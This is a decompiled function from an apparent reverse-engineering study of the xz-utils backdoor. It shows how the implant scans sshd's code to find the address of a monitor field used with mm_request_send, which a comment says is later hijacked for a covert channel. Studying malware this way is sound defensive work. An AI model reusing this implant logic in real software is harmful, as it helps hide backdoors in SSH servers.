// /home/kali/xzre-ghidra/xzregh/102FF0_sshd_find_monitor_field_addr_in_function.c
// Function: sshd_find_monitor_field_addr_in_function @ 0x102FF0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_find_monitor_field_addr_in_function(u8 * code_start, u8 * code_end, u8 * data_start, u8 * data_end, void * * monitor_field_ptr_out, global_context_t * ctx)
/*
 * AutoDoc: Tracks how sshd loads a monitor field and passes it to mm_request_send, returning the field's address when the pattern matches. The implant leverages this to recover the monitor receive/transmit descriptors it later hijacks for its covert channel.
 */

#include "xzre_types.h"


BOOL sshd_find_monitor_field_addr_in_function
               (u8 *code_start,u8 *code_end,u8 *data_start,u8 *data_end,void **monitor_field_ptr_out
               ,global_context_t *ctx)

{
  byte bVar1;
  uint uVar2;
  BOOL BVar3;
  u8 *puVar4;
  undefined1 uVar5;
  undefined1 uVar6;
  long lVar7;
  undefined1 uVar8;
  u8 *code_start_00;
  u8 **ppuVar9;
  u8 *code_end_00;
  u8 *local_80;
  u64 local_78;
  _union_75 local_70;
  byte local_60;
  int local_58;
  u8 *local_50;
  
  *monitor_field_ptr_out = (void *)0x0;
  puVar4 = (u8 *)0x0;
  if (code_start < code_end) {
    ppuVar9 = &local_80;
    for (lVar7 = 0x16; lVar7 != 0; lVar7 = lVar7 + -1) {
      *(undefined4 *)ppuVar9 = 0;
      ppuVar9 = (u8 **)((long)ppuVar9 + 4);
    }
    while( true ) {
      uVar2 = find_mov_lea_instruction(code_start,code_end,1,1,(dasm_ctx_t *)&local_80);
      puVar4 = (u8 *)(ulong)uVar2;
      if (uVar2 == 0) break;
      puVar4 = (u8 *)0x0;
      if (((local_70._0_4_ & 0x100) != 0) &&
         (puVar4 = local_50, ((uint)local_70.field0.field11_0xc & 0xff00ff00) == 0x5000000)) {
        puVar4 = local_80 + (long)local_50 + local_78;
      }
      uVar5 = 0;
      if ((local_70._0_4_ & 0x1040) != 0) {
        if ((local_70._0_4_ & 0x40) == 0) {
          uVar5 = local_70.field0.flags2 & 0x10;
          if (((local_70._0_4_ & 0x1000) != 0) && (uVar5 = local_60, (local_70._0_4_ & 0x20) != 0))
          {
            bVar1 = (char)local_70.field0.field10_0xb << 3;
            goto LAB_001030d4;
          }
        }
        else {
          uVar5 = local_70._14_1_;
          if ((local_70._0_4_ & 0x20) != 0) {
            bVar1 = (char)local_70.field0.field10_0xb * '\x02';
LAB_001030d4:
            uVar5 = uVar5 | bVar1 & 8;
          }
        }
      }
      code_start = local_80 + local_78;
      if ((data_start <= puVar4) && (puVar4 < data_end)) {
        code_end_00 = code_start + 0x40;
        if (ctx->sshd_code_end < code_start + 0x40) {
          code_end_00 = (u8 *)ctx->sshd_code_end;
        }
        uVar8 = 0;
        uVar6 = 0;
        code_start_00 = code_start;
LAB_00103110:
        do {
          BVar3 = x86_dasm((dasm_ctx_t *)&local_80,code_start_00,code_end_00);
          if (BVar3 == 0) {
            code_start_00 = code_start_00 + 1;
          }
          else {
            code_start_00 = local_80 + local_78;
            if (local_58 == 0x109) {
              bVar1 = local_70._15_1_;
              if ((local_70._0_4_ & 0x1040) == 0) {
                if ((local_70._0_4_ & 0x40) != 0) goto LAB_00103237;
              }
              else if ((local_70._0_4_ & 0x40) == 0) {
                uVar6 = local_70.field0.flags2 & 0x10;
                if (((local_70._0_4_ & 0x1000) != 0) &&
                   (uVar6 = local_60, (local_70._0_4_ & 0x20) != 0)) {
                  uVar6 = local_60 | ((byte)local_70.field0.field10_0xb & 1) << 3;
                }
              }
              else {
                uVar6 = local_70._14_1_;
                if ((local_70._0_4_ & 0x20) != 0) {
                  uVar6 = local_70._14_1_ | (char)local_70.field0.field10_0xb * '\x02' & 8U;
                }
LAB_00103237:
                uVar8 = bVar1;
                if ((local_70._0_4_ & 0x20) != 0) {
                  uVar8 = bVar1 | ((byte)local_70.field0.field10_0xb & 1) << 3;
                }
              }
            }
            else if (local_58 == 0x10b) {
              if ((local_70._0_4_ & 0x40) == 0) {
                if ((local_70._0_4_ & 0x1040) != 0) {
                  bVar1 = local_60;
                  if ((local_70._0_4_ & 0x1000) != 0) goto LAB_00103237;
                  uVar8 = local_70.field0.flags2 & 0x10;
                  if (uVar5 != uVar6) goto LAB_0010325f;
                  uVar8 = 0;
                  uVar5 = local_70.field0.flags2 & 0x10;
                  goto LAB_00103110;
                }
              }
              else if ((local_70._0_4_ & 0x20) == 0) {
                uVar6 = local_70._15_1_;
                if ((local_70._0_4_ & 0x1040) != 0) {
                  uVar8 = local_70._14_1_;
                }
              }
              else {
                uVar6 = local_70._15_1_ | (char)local_70.field0.field10_0xb * '\b' & 8U;
                if ((local_70._0_4_ & 0x1040) != 0) {
                  uVar8 = (char)local_70.field0.field10_0xb * '\x02' & 8U | local_70._14_1_;
                }
              }
            }
            if (uVar5 == uVar6) {
              uVar5 = uVar8;
              if (uVar8 == 7) {
                uVar2 = find_call_instruction
                                  (local_80 + local_78,code_end_00,
                                   (u8 *)ctx->sshd_ctx->mm_request_send_start,
                                   (dasm_ctx_t *)&local_80);
                if (uVar2 != 0) {
                  *monitor_field_ptr_out = puVar4;
                  puVar4 = (u8 *)(ulong)uVar2;
                  goto LAB_001032a5;
                }
                break;
              }
              goto LAB_00103110;
            }
          }
LAB_0010325f:
        } while (code_start_00 < code_end_00);
      }
      puVar4 = code_end;
      if (code_end <= code_start) break;
    }
  }
LAB_001032a5:
  return (BOOL)puVar4;
}

